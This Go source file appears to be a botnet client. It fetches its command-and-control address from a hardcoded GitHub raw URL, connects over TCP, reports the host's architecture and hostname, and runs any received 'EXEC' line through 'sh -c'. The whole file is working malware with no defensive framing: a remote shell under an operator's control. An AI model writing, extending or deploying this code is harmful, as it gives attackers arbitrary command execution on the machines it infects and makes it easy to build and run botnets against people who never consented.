package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

const defaultAddress = "localhost:8080"
const addrSource = "https://github.com/malasahjagotwin/cgo/raw/refs/heads/main/abots/address.txt"
const beatInterval = 15 * time.Second
const retryInterval = 500 * time.Microsecond
const syncInterval = 30 * time.Second

func readAddressFile() string {
	for _, p := range []string{"address.txt", filepath.Join("abots", "address.txt")} {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		addr := strings.TrimSpace(string(data))
		if addr != "" {
			return addr
		}
	}
	return defaultAddress
}

func fetchAddress() (string, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(addrSource)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status %s", resp.Status)
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	addr := strings.TrimSpace(string(data))
	if addr == "" {
		return "", fmt.Errorf("empty address")
	}
	return addr, nil
}

func archName() string {
	switch runtime.GOARCH {
	case "amd64":
		return "x86_64"
	case "386", "i386", "i686":
		return "x86"
	case "mipsle", "mips64", "mips64le":
		return "mips"
	default:
		return runtime.GOARCH
	}
}

func machine() string {
	if h, err := os.Hostname(); err == nil && h != "" {
		return h
	}
	return "bot"
}

func execLine(line string) {
	line = strings.TrimSpace(line)
	if !strings.HasPrefix(line, "EXEC ") {
		return
	}
	cmd := strings.TrimPrefix(line, "EXEC ")
	fmt.Printf("[bot] executing: %s\n", cmd)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		fmt.Printf("[bot] exec failed: %v\n%s", err, out)
		return
	}
	fmt.Printf("[bot] done\n%s", out)
}

func connect(addr string) error {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	fmt.Printf("[bot] connected to %s\n", addr)

	ident := fmt.Sprintf("BEAT %s %s\n", archName(), machine())
	if _, err := fmt.Fprint(conn, ident); err != nil {
		return err
	}

	r := bufio.NewReader(conn)
	for {
		conn.SetReadDeadline(time.Now().Add(beatInterval))
		line, err := r.ReadString('\n')
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				if _, err := fmt.Fprint(conn, "PING\n"); err != nil {
					return err
				}
				continue
			}
			return err
		}
		go execLine(line)
	}
}

func syncAddress() string {
	addr, err := fetchAddress()
	if err != nil {
		return ""
	}
	fmt.Printf("[bot] address updated to %s\n", addr)
	return addr
}

func main() {
	addr := readAddressFile()
	fmt.Printf("[bot] heartbeat target: %s\n", addr)

	lastSync := time.Now().Add(-syncInterval)
	for {
		if time.Since(lastSync) >= syncInterval {
			lastSync = time.Now()
			if got := syncAddress(); got != "" && got != addr {
				addr = got
			}
		}
		if err := connect(addr); err != nil {
			fmt.Printf("[bot] heartbeat lost on %s: %v\n", addr, err)
		}
		time.Sleep(retryInterval)
	}
}